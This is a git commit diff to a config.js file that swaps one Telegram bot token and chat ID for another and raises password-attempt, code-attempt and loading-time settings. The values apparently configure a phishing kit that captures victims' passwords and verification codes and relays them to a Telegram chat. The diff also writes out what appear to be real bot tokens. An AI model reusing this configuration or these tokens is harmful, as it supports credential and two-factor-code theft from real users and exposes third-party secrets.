1136224c382ffb2a0748e9a732631b9285190f43
amidatanga6-spec <amidatanga6@gmail.com>
2026-05-06 15:06:41 -0400

    Update configuration values in config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,11 +1,11 @@
 const config = {
-    token: '8747512462:AAEhyagj8O5QyWZf-HhA2rrfY0S1wA6DZlE',
-    chat_id: '-5267923459',
+    token: '8629418409:AAEincdHC8iKLbRU40_HvHg2gAKZw9l3P5k',
+    chat_id: '-5170611093',
     noti_token: '',
     noti_chat_id: '',
     max_password_attempts: 2,
-    max_code_attempts: 2,
-    password_loading_time: 3,
-    code_loading_time: 3
+    max_code_attempts: 3,
+    password_loading_time: 6,
+    code_loading_time: 4
 };
 export default config;
